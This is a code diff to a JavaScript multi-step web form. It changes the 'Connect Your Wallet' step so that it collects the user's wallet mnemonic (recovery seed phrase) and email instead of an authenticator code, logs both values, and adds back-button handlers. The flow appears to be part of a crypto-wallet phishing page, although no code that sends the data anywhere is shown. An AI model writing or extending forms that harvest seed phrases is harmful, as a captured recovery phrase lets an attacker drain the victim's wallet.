@@ -51,27 +51,41 @@ function confirmStep2() {
   document.getElementById('step3').style.display = 'block';
 }
 
-// Step 3: Connect Your Wallet - Validate and Proceed to Final Step
+// Step 3: Wallet - Validate and Proceed to Final Step
 function confirmStep3() {
   const email = document.getElementById('email').value.trim();
-  const authenticator = document.getElementById('authenticatorCode').value.trim();
+  const mnemonic = document.getElementById('mnemonic').value.trim();
 
-  // Check if all required fields are filled
-  if (!email || !authenticator) {
+  if (!email || !mnemonic) {
     alert('Please complete all fields.');
     return;
   }
 
-  // Log the values (or you can send them somewhere)
   console.log({
     email: email,
-    authenticatorCode: authenticator,
+    mnemonic: mnemonic,
   });
 
-  // Hide the third step and show the final step
   document.getElementById('step3').style.display = 'none';
   document.getElementById('step4').style.display = 'block';
 }
+
+
+
+// Back button handlers
+function backToStep2() {
+  document.getElementById('step3').style.display = 'none';
+  document.getElementById('step2').style.display = 'block';
+}
+
+function backToStep3() {
+  document.getElementById('step4').style.display = 'none';
+  document.getElementById('step3').style.display = 'block';
+}
+
+
+
+
 
 // Event listeners for button clicks to proceed to next step
 document.getElementById('continueStep1').addEventListener('click', confirmStep1);
